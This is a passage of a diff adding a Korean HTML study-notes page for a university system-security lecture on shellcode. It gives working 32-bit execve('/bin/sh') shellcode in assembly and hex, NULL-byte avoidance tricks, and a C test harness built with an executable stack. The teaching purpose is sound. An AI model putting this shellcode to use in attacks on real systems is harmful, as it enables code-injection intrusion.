+              <tr><td class="mono" style="color:#82aaff">__NR_fork</td><td class="mono" style="color:#fbbf24"><strong>2</strong></td><td class="mono">__NR_set_thread_area</td><td class="mono">243</td></tr>
+              <tr><td class="mono">__NR_read</td><td class="mono">3</td><td class="mono">__NR_io_setup</td><td class="mono">245</td></tr>
+              <tr><td class="mono">__NR_write</td><td class="mono">4</td><td class="mono">__NR_io_submit</td><td class="mono">248</td></tr>
+              <tr><td class="mono">__NR_open</td><td class="mono">5</td><td class="mono">__NR_alloc_hugepages</td><td class="mono">250</td></tr>
+              <tr><td class="mono">__NR_close</td><td class="mono">6</td><td class="mono">__NR_free_hugepages</td><td class="mono">251</td></tr>
+              <tr><td class="mono" style="color:#82aaff">__NR_execve</td><td class="mono" style="color:#fbbf24"><strong>11</strong></td><td class="mono">__NR_exit_group</td><td class="mono">252</td></tr>
+            </tbody>
+          </table>
+        </div>
+        <div class="callout key"><strong>기억할 번호:</strong> <code class="inline">__NR_fork = 2</code>, <code class="inline">__NR_execve = 11 (0x0b)</code> — 특히 execve의 <strong>0x0b</strong>는 쉘코드에서 eax에 넣는 값이다.</div>
+        <span class="slide-ref">slide 44</span>
+      </div>
+    </section>
+
+    <!-- ========= 07 ========= -->
+    <section id="s07">
+      <div class="sec-head"><span class="sec-num">07</span><h2>Shellcode 개념</h2></div>
+      <div class="sec-divider"></div>
+
+      <div class="card">
+        <h3>Shellcode란? <span class="tag">code injection</span></h3>
+        <ul>
+          <li>코드 인젝션 공격에서는 바이너리 코드를 주입해야 한다.</li>
+          <li>Shellcode는 주입 코드로 가장 흔히 선택되는 코드다.</li>
+          <li><strong>목표: 쉘(shell)을 얻는 것.</strong> 쉘을 얻고 나면 임의의 명령을 실행할 수 있다.</li>
+          <li>어셈블리 코드로 작성한다.</li>
+        </ul>
+        <span class="slide-ref">slide 46</span>
+      </div>
+
+      <div class="card">
+        <h3>C로 표현한 Shellcode의 논리 <span class="tag">shellcode.c</span></h3>
+        <p class="lead">쉘코드가 궁극적으로 하려는 일은 아래 C 코드와 같다 — <code class="inline">/bin/sh</code>를 execve로 실행.</p>
+        <pre><code><span class="c-kw">#include</span> <span class="c-str">&lt;unistd.h&gt;</span>
+<span class="c-kw">void</span> <span class="c-fn">main</span>()
+{
+    <span class="c-kw">char</span> *argv[<span class="c-num">2</span>];
+    argv[<span class="c-num">0</span>] = <span class="c-str">"/bin/sh"</span>;
+    argv[<span class="c-num">1</span>] = <span class="c-kw">NULL</span>;
+    <span class="c-fn">execve</span>(argv[<span class="c-num">0</span>], argv, <span class="c-kw">NULL</span>);
+}</code></pre>
+        <span class="slide-ref">slide 47</span>
+      </div>
+
+      <div class="card">
+        <h3>바이너리 코드 획득 — 왜 직접 어셈블리로 짜는가 <span class="tag">objdump</span></h3>
+        <p>C를 컴파일해 바이너리를 뽑으면 아래처럼 문제가 되는 바이트가 섞인다.</p>
+        <pre><code><span class="c-com">$ gcc -m32 shellcode.c</span>
+<span class="c-com">$ objdump -Mintel --disassemble a.out</span>
+000011ed &lt;main&gt;:
+ 11ed: f3 0f 1e fb              endbr32
+ 11f1: 8d 4c 24 04              lea ecx,[esp+0x4]
+ ...
+ 1203: e8 54 <span class="c-hl">00 00 00</span>        <span class="c-kw">call</span> 125c &lt;__x86.get_pc_thunk.ax&gt;
+ 1208: 05 cc 2d <span class="c-hl">00 00</span>        add eax,0x2dcc
+ 120d: 65 8b 1d 14 <span class="c-hl">00 00 00</span>  mov ebx,DWORD PTR gs:0x14
+ 1238: e8 63 fe ff ff          <span class="c-kw">call</span> 10a0 &lt;execve@plt&gt;</code></pre>
+        <div class="callout warn">컴파일 결과에는 <code class="inline">00</code>(NULL) 바이트가 다수 포함되고, <code class="inline">execve@plt</code>처럼 라이브러리/로더에 의존하는 호출이 들어간다. 그래서 쉘코드는 <strong>어셈블리로 직접</strong> 작성해 이런 의존성과 NULL을 제거한다.</div>
+        <span class="slide-ref">slide 48</span>
+      </div>
+    </section>
+
+    <!-- ========= 08 ========= -->
+    <section id="s08">
+      <div class="sec-head"><span class="sec-num">08</span><h2>어셈블리로 Shellcode 작성</h2></div>
+      <div class="sec-divider"></div>
+
+      <div class="card">
+        <h3>execve("/bin/sh", argv, 0) 호출 규약 <span class="tag">레지스터 세팅</span></h3>
+        <p class="lead">int 0x80 방식으로 execve를 부르려면 아래 레지스터를 모두 세팅해야 한다.</p>
+        <div class="tbl-wrap">
+          <table>
+            <thead><tr><th class="mono">레지스터</th><th>의미</th></tr></thead>
+            <tbody>
+              <tr><td class="mono" style="color:#82aaff">eax</td><td><code class="inline">0x0b</code> — execve() 시스템 콜 번호</td></tr>
+              <tr><td class="mono" style="color:#82aaff">ebx</td><td>명령 문자열 <strong>"/bin/sh"</strong>의 주소</td></tr>
+              <tr><td class="mono" style="color:#82aaff">ecx</td><td>인자 배열 <strong>argv</strong>의 주소</td></tr>
+              <tr><td class="mono" style="color:#82aaff">edx</td><td>환경변수의 주소 (여기서는 <strong>0</strong>)</td></tr>
+            </tbody>
+          </table>
+        </div>
+        <div class="callout q">코드 안에 zero(NULL 바이트)를 넣을 수 없는 이유는? → 쉘코드는 보통 <code class="inline">strcpy</code> 등 <strong>문자열 복사</strong>로 주입되는데, NULL 바이트가 문자열 종료 문자로 해석되어 그 뒤 코드가 복사되지 않기 때문이다.</div>
+        <span class="slide-ref">slide 49</span>
+      </div>
+
+      <div class="card">
+        <h3>ebx 세팅 — "/bin//sh" 문자열을 스택에 구성</h3>
+        <div class="split">
+          <div class="desc">
+            <p>문자열을 스택에 직접 push해 그 주소를 ebx에 담는다. <code class="inline">/bin//sh</code>처럼 <strong>//</strong>를 쓰는 이유는 8바이트(=4바이트 ×2)로 딱 맞춰 push하기 위함이다 (<code class="inline">/bin/sh</code>는 7글자라 정렬이 애매). 추가된 <code class="inline">/</code>는 경로상 무시된다.</p>
+            <ul>
+              <li><code class="inline">xor eax,eax</code> → eax=0 (NULL 종료용)</li>
+              <li><code class="inline">push eax</code> → 문자열 끝 <code class="inline">\0</code></li>
+              <li><code class="inline">push "//sh"</code>, <code class="inline">push "/bin"</code></li>
+              <li><code class="inline">mov ebx,esp</code> → 문자열 시작 주소 획득</li>
+            </ul>
+          </div>
+          <div>
+            <pre style="margin:0"><code><span class="c-kw">xor</span>  <span class="c-reg">eax</span>, <span class="c-reg">eax</span>
+<span class="c-kw">push</span> <span class="c-reg">eax</span>
+<span class="c-kw">push</span> <span class="c-str">"//sh"</span>
+<span class="c-kw">push</span> <span class="c-str">"/bin"</span>
+<span class="c-kw">mov</span>  <span class="c-reg">ebx</span>, <span class="c-reg">esp</span></code></pre>
+            <div class="svg-wrap" style="margin-top:12px">
+              <svg viewBox="0 0 260 150" xmlns="http://www.w3.org/2000/svg">
+                <text x="40" y="20" text-anchor="middle" fill="#9aa5b8" font-size="10">High</text>
+                <rect x="70" y="24" width="120" height="100" fill="#0d1322" stroke="#2d3850"/>
+                <text x="130" y="80" text-anchor="middle" fill="#34d399" font-size="14" class="svg-mono" transform="rotate(-90 130 80)">/bin//sh\0</text>
+                <text x="40" y="128" text-anchor="middle" fill="#9aa5b8" font-size="10">Low</text>
+                <line x1="192" y1="124" x2="232" y2="124" stroke="#38bdf8" stroke-width="2" marker-end="url(#ae)"/>
+                <text x="236" y="128" fill="#38bdf8" font-size="11" class="svg-mono">esp</text>
+                <defs><marker id="ae" markerWidth="8" markerHeight="8" refX="6" refY="3" orient="auto"><path d="M0,0 L6,3 L0,6 Z" fill="#38bdf8"/></marker></defs>
+              </svg>
+              <div class="svg-caption">ebx ← esp</div>
+            </div>
+          </div>
+        </div>
+        <span class="slide-ref">slide 50</span>
+      </div>
+
+      <div class="card">
+        <h3>ecx 세팅 — argv[] 배열 구성</h3>
+        <div class="split">
+          <div class="desc">
+            <p>argv 배열은 <code class="inline">argv[0]="/bin//sh"의 주소</code>, <code class="inline">argv[1]=0</code> 두 원소로 구성한다. 역시 스택에 push하고 그 주소를 ecx에 담는다.</p>
+            <ul>
+              <li><code class="inline">push eax</code> → argv[1] = 0</li>
+              <li><code class="inline">push ebx</code> → argv[0] = 문자열 주소</li>
+              <li><code class="inline">mov ecx,esp</code> → argv 배열 주소</li>
+            </ul>
+          </div>
+          <div>
+            <pre style="margin:0"><code><span class="c-kw">push</span> <span class="c-reg">eax</span>        <span class="c-com">; argv[1]</span>
+<span class="c-kw">push</span> <span class="c-reg">ebx</span>        <span class="c-com">; argv[0]</span>
+<span class="c-kw">mov</span>  <span class="c-reg">ecx</span>, <span class="c-reg">esp</span>   <span class="c-com">; ecx</span></code></pre>
+            <div class="svg-wrap" style="margin-top:12px">
+              <svg viewBox="0 0 280 160" xmlns="http://www.w3.org/2000/svg">
+                <rect x="70" y="14" width="120" height="70" fill="#0d1322" stroke="#2d3850"/>
+                <text x="130" y="52" text-anchor="middle" fill="#34d399" font-size="12" class="svg-mono" transform="rotate(-90 130 52)">/bin//sh\0</text>
+                <rect x="70" y="84" width="120" height="28" fill="#2a3b5e" stroke="#2d3850"/><text x="130" y="102" text-anchor="middle" fill="#e5e9f0" font-size="11" class="svg-mono">argv[1]=0</text>
+                <rect x="70" y="112" width="120" height="28" fill="#2a3b5e" stroke="#2d3850"/><text x="130" y="130" text-anchor="middle" fill="#e5e9f0" font-size="11" class="svg-mono">argv[0]</text>
+                <path d="M68,126 L50,126 L50,98 L68,98" fill="none" stroke="#4f8cff" stroke-width="1.5" marker-end="url(#ac)"/>
+                <line x1="192" y1="140" x2="232" y2="140" stroke="#38bdf8" stroke-width="2" marker-end="url(#ac2)"/>
+                <text x="236" y="144" fill="#38bdf8" font-size="11" class="svg-mono">esp</text>
+                <defs>
+                  <marker id="ac" markerWidth="8" markerHeight="8" refX="6" refY="3" orient="auto"><path d="M0,0 L6,3 L0,6 Z" fill="#4f8cff"/></marker>
+                  <marker id="ac2" markerWidth="8" markerHeight="8" refX="6" refY="3" orient="auto"><path d="M0,0 L6,3 L0,6 Z" fill="#38bdf8"/></marker>
+                </defs>
+              </svg>
+              <div class="svg-caption">ecx ← esp (argv)</div>
+            </div>
+          </div>
+        </div>
+        <span class="slide-ref">slide 51</span>
+      </div>
+
+      <div class="card">
+        <h3>edx 세팅 &amp; execve 호출</h3>
+        <h4>edx = 0 (환경변수 없음)</h4>
+        <pre><code><span class="c-kw">xor</span> <span class="c-reg">edx</span>, <span class="c-reg">edx</span></code></pre>
+        <h4>eax = 0x0b 세팅 후 int 0x80</h4>
+        <pre><code><span class="c-kw">xor</span> <span class="c-reg">eax</span>, <span class="c-reg">eax</span>    <span class="c-com">; eax = 0x00000000</span>
+<span class="c-kw">mov</span> <span class="c-reg">al</span>, <span class="c-num">0x0b</span>     <span class="c-com">; eax = 0x0000000b  (al = eax 하위 1바이트)</span>
+<span class="c-kw">int</span> <span class="c-num">0x80</span></code></pre>
+        <div class="callout key"><strong>al 트릭:</strong> <code class="inline">mov eax,0x0b</code>은 기계어가 <code class="inline">b8 0b 00 00 00</code>으로 NULL이 생긴다. 대신 eax를 0으로 지운 뒤 <code class="inline">mov al,0x0b</code>로 최하위 바이트만 채우면 NULL 없이 동일한 결과를 얻는다.</div>
+        <span class="slide-ref">slide 52–53</span>
+      </div>
+
+      <div class="card">
+        <h3>전체 조립 (Putting Everything Together)</h3>
+        <pre><code><span class="c-kw">xor</span>  <span class="c-reg">eax</span>, <span class="c-reg">eax</span>
+<span class="c-kw">push</span> <span class="c-reg">eax</span>           <span class="c-com">; Use 0 to terminate the string</span>
+<span class="c-kw">push</span> <span class="c-str">"//sh"</span>
+<span class="c-kw">push</span> <span class="c-str">"/bin"</span>
+<span class="c-kw">mov</span>  <span class="c-reg">ebx</span>, <span class="c-reg">esp</span>      <span class="c-com">; Get the string address</span>
+
+<span class="c-com">; Construct the argument array argv[]</span>
+<span class="c-kw">push</span> <span class="c-reg">eax</span>           <span class="c-com">; argv[1] = 0</span>
+<span class="c-kw">push</span> <span class="c-reg">ebx</span>           <span class="c-com">; argv[0] points "/bin//sh"</span>
+<span class="c-kw">mov</span>  <span class="c-reg">ecx</span>, <span class="c-reg">esp</span>      <span class="c-com">; Get the address of argv[]</span>
+
+<span class="c-com">; For environment variable</span>
+<span class="c-kw">xor</span>  <span class="c-reg">edx</span>, <span class="c-reg">edx</span>      <span class="c-com">; No env variables</span>
+
+<span class="c-com">; Invoke execve()</span>
+<span class="c-kw">xor</span>  <span class="c-reg">eax</span>, <span class="c-reg">eax</span>      <span class="c-com">; eax = 0x00000000</span>
+<span class="c-kw">mov</span>  <span class="c-reg">al</span>, <span class="c-num">0x0b</span>       <span class="c-com">; eax = 0x0000000b</span>
+<span class="c-kw">int</span> <span class="c-num">0x80</span></code></pre>
+        <h4>컴파일 &amp; 테스트</h4>
+        <pre><code><span class="c-com">$ nasm -f elf32 -o shellcode_one.o shellcode_one.s</span>
+<span class="c-com">$ ld -m elf_i386 -o shellcode_one shellcode_one.o</span>
+$ echo $$
+9650    <span class="c-com">&lt;-- the current shell's process ID</span>
+$ ./shellcode_one
+$ echo $$
+12380   <span class="c-com">&lt;-- a new shell (PID가 바뀜 = 성공)</span></code></pre>
+        <span class="slide-ref">slide 54–55</span>
+      </div>
+    </section>
+
+    <!-- ========= 09 ========= -->
+    <section id="s09">
+      <div class="sec-head"><span class="sec-num">09</span><h2>Zero 바이트 제거 기법</h2></div>
+      <div class="sec-divider"></div>
+
+      <div class="card">
+        <h3>Shellcode 2 — 기계어 표 &amp; C 테스트 하네스</h3>
+        <p class="lead">아래는 jmp-call-pop 방식(10절)으로 만든 쉘코드의 어셈블리 ↔ 기계어 매핑이다. <span class="byte">빨간색 00</span>이 없음에 주목.</p>
+        <div class="tbl-wrap">
+          <table>
+            <thead><tr><th class="mono">어셈블리어 코드</th><th class="mono">기계어</th><th>바이트</th></tr></thead>
+            <tbody>
+              <tr><td class="asm">jmp call</td><td class="mono">\xeb\x2a</td><td>2</td></tr>
+              <tr><td class="asm">shell: popl %esi</td><td class="mono">\x5e</td><td>1</td></tr>
+              <tr><td class="asm">movb $0x0, 0x7(%esi)</td><td class="mono">\xc6\x46\x07\x00</td><td>4</td></tr>
+              <tr><td class="asm">movl %esi, 0x8(%esi)</td><td class="mono">\x89\x76\x08</td><td>3</td></tr>
+              <tr><td class="asm">movl $0x0, 0xc(%esi)</td><td class="mono">\xc7\x46\x0c\x00\x00\x00\x00</td><td>7</td></tr>
+              <tr><td class="asm">movl $0xb, %eax</td><td class="mono">\xb8\x0b\x00\x00\x00</td><td>5</td></tr>
+              <tr><td class="asm">movl %esi, %ebx</td><td class="mono">\x89\xf3</td><td>2</td></tr>
+              <tr><td class="asm">leal 0x8(%esi), %ecx</td><td class="mono">\x8d\x4e\x08</td><td>3</td></tr>
+              <tr><td class="asm">leal 0xc(%esi), %edx</td><td class="mono">\x8d\x56\x0c</td><td>3</td></tr>
+              <tr><td class="asm">int $0x80</td><td class="mono">\xcd\x80</td><td>2</td></tr>
+              <tr><td class="asm">movl $0x1, %eax</td><td class="mono">\xb8\x01\x00\x00\x00</td><td>5</td></tr>
+              <tr><td class="asm">movl $0x0, %ebx</td><td class="mono">\xbb\x00\x00\x00\x00</td><td>5</td></tr>
+              <tr><td class="asm">int $0x80</td><td class="mono">\xcd\x80</td><td>2</td></tr>
+              <tr><td class="asm">call: call shell</td><td class="mono">\xe8\xd1\xff\xff\xff</td><td>5</td></tr>
+              <tr><td class="asm">.string \"/bin/sh\"</td><td class="mono">\x2f\x62\x69\x6e\x2f\x73\x68</td><td>7</td></tr>
+            </tbody>
+          </table>
+        </div>
+        <h4>shelltest.c — 쉘코드 실행 테스트</h4>
+        <pre><code><span class="c-com">// gcc -Wl,-z,execstack -m32 shelltest.c</span>
+<span class="c-kw">char</span> shell[] =
+<span class="c-str">"\xeb\x2a\x5e\xc6\x46\x07\x00\x89\x76\x08\xc7\x46\x0c\x00\x00\x00\x00"</span>
+<span class="c-str">"\xb8\x0b\x00\x00\x00\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\xb8\x01"</span>
+<span class="c-str">"\x00\x00\x00\xbb\x00\x00\x00\x00\xcd\x80\xe8\xd1\xff\xff\xff"</span>
+<span class="c-str">"\x2f\x62\x69\x6e\x2f\x73\x68"</span>;
+
+<span class="c-kw">void</span> <span class="c-fn">main</span>() {
+    <span class="c-kw">void</span>(*func)() = (<span class="c-kw">void</span>(*)())shell;
+    <span class="c-fn">func</span>();
+}</code></pre>
+        <div class="callout warn"><code class="inline">-Wl,-z,execstack</code>: 스택을 실행 가능으로 만들어야 스택에 적재된 쉘코드가 동작한다(NX/DEP 우회 실습용).</div>
+        <span class="slide-ref">slide 56–57</span>
+      </div>
+
+      <div class="card">
+        <h3>How to Avoid Zeros — 핵심 3대 기법</h3>
+        <h4>① xor 사용</h4>
+        <ul>
+          <li><code class="inline">mov eax, 0</code> → 기계어에 zero 포함 → <strong>나쁨</strong></li>
+          <li><code class="inline">xor eax, eax</code> → 기계어에 zero 없음 → <strong>좋음</strong></li>
+        </ul>
+        <h4>② 1바이트 operand 명령 사용</h4>
+        <p>0x00000099를 eax에 넣으려면?</p>
+        <ul>
+          <li><code class="inline">mov eax, 0x99</code> → 실제로는 <code class="inline">0x<span style="color:var(--red)">000000</span>99</code>라 NULL 3개 → 나쁨</li>
+          <li><code class="inline">xor eax,eax; mov al,0x99</code> → al은 eax의 <strong>최하위 1바이트</strong> → NULL 없음</li>
+        </ul>
+        <span class="slide-ref">slide 59</span>
+      </div>
+
+      <div class="card">
+        <h3>③ Shift 연산으로 상위 NULL 밀어내기</h3>
+        <div class="split">
+          <div class="desc">
+            <p>0x00112233을 ebx에 넣고 싶을 때, 직접 쓰면 상위 바이트 <code class="inline">00</code>이 문제가 된다. 대신 <strong>최상위를 FF로 채운 값</strong>을 넣고 좌/우 shift로 밀어낸다.</p>
+            <ul>
+              <li><code class="inline">mov ebx, 0xFF112233</code> (NULL 없음)</li>
+              <li><code class="inline">shl ebx, 8</code> → 최상위 FF 제거: <code class="inline">0x11223300</code></li>
+              <li><code class="inline">shr ebx, 8</code> → 다시 당김: <code class="inline">0x00112233</code></li>
+            </ul>
+          </div>
+          <div>
+            <pre style="margin:0"><code><span class="c-kw">mov</span> <span class="c-reg">ebx</span>, <span class="c-num">0xFF112233</span>
+<span class="c-kw">shl</span> <span class="c-reg">ebx</span>, <span class="c-num">8</span>
+<span class="c-kw">shr</span> <span class="c-reg">ebx</span>, <span class="c-num">8</span></code></pre>
+          </div>
+        </div>
+        <h4>문자열에도 shift 적용 — "/bin/bash" push (// 기법 없이)</h4>
+        <pre><code><span class="c-kw">mov</span>  <span class="c-reg">edx</span>, <span class="c-str">"h***"</span>
+<span class="c-kw">shl</span>  <span class="c-reg">edx</span>, <span class="c-num">24</span>     <span class="c-com">; shift left 24 bits</span>
+<span class="c-kw">shr</span>  <span class="c-reg">edx</span>, <span class="c-num">24</span>     <span class="c-com">; shift right 24 bits</span>
+<span class="c-kw">push</span> <span class="c-reg">edx</span>         <span class="c-com">; edx now contains h\0\0\0</span>
+<span class="c-kw">push</span> <span class="c-str">"/bas"</span>
+<span class="c-kw">push</span> <span class="c-str">"/bin"</span>
+<span class="c-kw">mov</span>  <span class="c-reg">ebx</span>, <span class="c-reg">esp</span>     <span class="c-com">; Get the string address</span></code></pre>
+        <p class="lead"><code class="inline">"h***"</code>를 24비트 좌우 shift하면 하위 1바이트 <code class="inline">h</code>만 남고 나머지는 <code class="inline">\0</code>으로 채워진다 → <code class="inline">"/bin/bash\0"</code> 완성.</p>
+        <span class="slide-ref">slide 60–61</span>
+      </div>
+    </section>
+
+    <!-- ========= 10 ========= -->
+    <section id="s10">
+      <div class="sec-head"><span class="sec-num">10</span><h2>Generic Shellcode (두 번째 방식)</h2></div>
+      <div class="sec-divider"></div>
+
+      <div class="card">
+        <h3>jmp-call-pop — 문자열/argv 주소 획득 트릭</h3>
+        <div class="split">
+          <div class="desc">
+            <p>스택에 문자열을 push하는 대신, 쉘코드 <strong>자체에 데이터를 붙여두고 그 주소를 얻는</strong> 방식이다. 핵심은 <code class="inline">call</code>이 복귀 주소(= 바로 뒤 데이터의 주소)를 스택에 push한다는 점을 이용하는 것.</p>
+            <ul>
+              <li><code class="inline">jmp short two</code> → 코드 끝의 <code class="inline">two</code>로 점프</li>
+              <li><code class="inline">two: call one</code> → <code class="inline">one</code>으로 가면서, <strong>바로 뒤 <code class="inline">/bin/sh*</code>의 주소</strong>를 스택에 push</li>
+              <li><code class="inline">one: pop ebx</code> → push된 그 주소를 ebx로 꺼냄 → 문자열 주소 확보</li>
+            </ul>
+          </div>
+          <div>
+            <pre style="margin:0"><code>_start:
+    BITS 32
+    <span class="c-kw">jmp short</span> two
+one:
+    <span class="c-kw">pop</span> <span class="c-reg">ebx</span>       <span class="c-com">; &lt;- call이 저장한</span>
+                  <span class="c-com">;    주소 pop</span>
+
+    <span class="c-com">.... code omitted ...</span>
+
+two:
+    <span class="c-kw">call</span> one      <span class="c-com">; 이 아래 주소가</span>
+                  <span class="c-com">; push됨</span>
+    <span class="c-kw">db</span> <span class="c-str">'/bin/sh*'</span>
+    <span class="c-kw">db</span> <span class="c-str">'AAAA'</span>
+    <span class="c-kw">db</span> <span class="c-str">'BBBB'</span></code></pre>
+          </div>
+        </div>
+        <span class="slide-ref">slide 63</span>
+      </div>
+
+      <div class="card">
+        <h3>Data Preparation — 문자열 종료 &amp; argv 구성</h3>
+        <p>ebx가 <code class="inline">/bin/sh*</code>의 시작 주소를 가리키므로, 오프셋으로 데이터를 가공한다. (<code class="inline">/bin/sh*</code>=8바이트, 이어 <code class="inline">AAAA</code>(argv[0] 자리, offset 8), <code class="inline">BBBB</code>(argv[1] 자리, offset 12))</p>
+        <h4>문자열 끝에 zero 넣기 (* → \0)</h4>
+        <pre><code><span class="c-kw">xor</span> <span class="c-reg">eax</span>, <span class="c-reg">eax</span>
+<span class="c-kw">mov</span> [<span class="c-reg">ebx</span>+<span class="c-num">7</span>], <span class="c-reg">al</span>   <span class="c-com">; '*' 위치(offset 7)를 \0으로</span></code></pre>
+        <h4>argv 배열 구성</h4>
+        <pre><code><span class="c-kw">mov</span> [<span class="c-reg">ebx</span>+<span class="c-num">8</span>],  <span class="c-reg">ebx</span>   <span class="c-com">; argv[0] = 문자열 주소</span>
+<span class="c-kw">mov</span> [<span class="c-reg">ebx</span>+<span class="c-num">12</span>], <span class="c-reg">eax</span>   <span class="c-com">; argv[1] = 0 (eax=0)</span>
+<span class="c-kw">lea</span> <span class="c-reg">ecx</span>, [<span class="c-reg">ebx</span>+<span class="c-num">8</span>]   <span class="c-com">; ecx = ebx + 8 (argv 주소)</span></code></pre>
+        <p class="lead">이후 <code class="inline">edx=0</code>, <code class="inline">eax=0x0b</code>, <code class="inline">int 0x80</code>으로 execve 호출 (08절과 동일).</p>
+        <span class="slide-ref">slide 64</span>
+      </div>
+
+      <div class="card">
+        <h3>컴파일 &amp; 테스트 — 쓰기 가능 코드 영역</h3>
+        <h4>문제: 코드 영역은 수정 불가 → Segmentation fault</h4>
+        <pre><code><span class="c-com">$ nasm -f elf32 -o shellcode_two.o shellcode_two.s</span>
+<span class="c-com">$ ld -m elf_i386 -o shellcode_two shellcode_two.o</span>
+$ ./shellcode_two
+<span style="color:var(--red)">Segmentation fault</span></code></pre>
+        <p>이 방식은 <code class="inline">mov [ebx+7], al</code>처럼 <strong>코드에 붙은 데이터(=코드 영역)를 수정</strong>하기 때문에, 기본적으로 읽기 전용인 코드 영역에서 오류가 난다.</p>
+        <h4>해결: 코드 영역을 쓰기 가능으로 — <code class="inline">--omagic</code></h4>
+        <pre><code>$ nasm -f elf32 -o shellcode_two.o shellcode_two.s
+$ ld <span class="c-hl">--omagic</span> -m elf_i386 -o shellcode_two shellcode_two.o
+$ ./shellcode_two
+$   <span class="c-com">&lt;-- new shell (성공)</span></code></pre>
+        <div class="callout key"><code class="inline">ld --omagic</code>는 text/data를 쓰기 가능한 하나의 세그먼트로 링크하여, 코드 영역 내 데이터 수정이 가능해진다.</div>
+        <span class="slide-ref">slide 65</span>
+      </div>
+    </section>
+
+    <!-- ========= 11 ========= -->
+    <section id="s11">
+      <div class="sec-head"><span class="sec-num">11</span><h2>요약</h2></div>
+      <div class="sec-divider"></div>
+
+      <div class="card">
+        <h3>두 가지 쉘코드 작성 방식 비교</h3>
+        <div class="tbl-wrap">
+          <table>
+            <thead><tr><th>구분</th><th>방식 1 — Push String</th><th>방식 2 — jmp-call-pop (Generic)</th></tr></thead>
+            <tbody>
+              <tr><td><strong>문자열 주소 획득</strong></td><td>스택에 직접 push 후 <code class="inline">mov ebx,esp</code></td><td><code class="inline">call</code>이 push한 복귀주소를 <code class="inline">pop ebx</code></td></tr>
+              <tr><td><strong>데이터 위치</strong></td><td>스택</td><td>코드 뒤에 붙임 (<code class="inline">db</code>)</td></tr>
+              <tr><td><strong>NULL 처리</strong></td><td>xor로 0 생성 후 push</td><td><code class="inline">mov [ebx+7],al</code>로 런타임에 종료</td></tr>
+              <tr><td><strong>특이 요구</strong></td><td>없음 (실행가능 스택이면 동작)</td><td>코드 영역 쓰기 필요 → <code class="inline">ld --omagic</code></td></tr>
+              <tr><td><strong>장점</strong></td><td>단순, 코드 수정 불필요</td><td>문자열/배열을 한 번에 레이아웃</td></tr>
+            </tbody>
+          </table>
+        </div>
+      </div>
+
+      <div class="card">
+        <h3>강의 핵심 정리</h3>
+        <div class="summary-grid">
+          <div class="summary-item"><div class="n">01</div><h4>Challenges</h4><p>쉘코드엔 NULL(00) 바이트가 없어야 한다 — 문자열 복사 시 잘리기 때문.</p></div>
+          <div class="summary-item"><div class="n">02</div><h4>Two Approaches</h4><p>Push-string 방식과 jmp-call-pop(Generic) 방식.</p></div>
+          <div class="summary-item"><div class="n">03</div><h4>32-bit Shellcode</h4><p>eax=0x0b, ebx=/bin/sh, ecx=argv, edx=0, <code class="inline">int 0x80</code>으로 execve 호출.</p></div>
+          <div class="summary-item"><div class="n">04</div><h4>Zero 제거</h4><p>xor / al 1바이트 operand / shl·shr shift 트릭.</p></div>
+          <div class="summary-item"><div class="n">05</div><h4>Generic Shellcode</h4><p>위치 독립적으로 데이터 주소를 얻는 범용 패턴. <code class="inline">--omagic</code> 필요.</p></div>
+          <div class="summary-item"><div class="n">06</div><h4>Syscall 메커니즘</h4><p>libc → int 0x80 → IDT[0x80] → sys_call_table[eax] → 핸들러.</p></div>
+        </div>
+      </div>
+    </section>
+
+    <footer>
+      System Security · Ch 6: Shellcode &nbsp;|&nbsp; Seungsoo Lee, Dept. of CSE, Incheon National University (CCLAB)<br>
+      오프라인 완전 독립 학습 정리 파일 · 외부 CDN/라이브러리 없음 · 모든 그래프 인라인 SVG
+    </footer>
+  </main>
+</div>
+
+<script>
+  // 스크롤스파이 — 현재 보고 있는 섹션을 TOC에 표시
+  (function () {
+    var links = Array.prototype.slice.call(document.querySelectorAll('.toc a'));
+    var sections = links.map(function (a) {
+      return document.querySelector(a.getAttribute('href'));
+    });
+    function onScroll() {
+      var pos = window.scrollY + 120;
+      var currentIdx = 0;
+      for (var i = 0; i < sections.length; i++) {
+        if (sections[i] && sections[i].offsetTop <= pos) currentIdx = i;
+      }
+      links.forEach(function (l, i) {
+        l.classList.toggle('active', i === currentIdx);
+      });
+    }
+    window.addEventListener('scroll', onScroll, { passive: true });
+    onScroll();
+  })();
+</script>
+</body>
+</html>
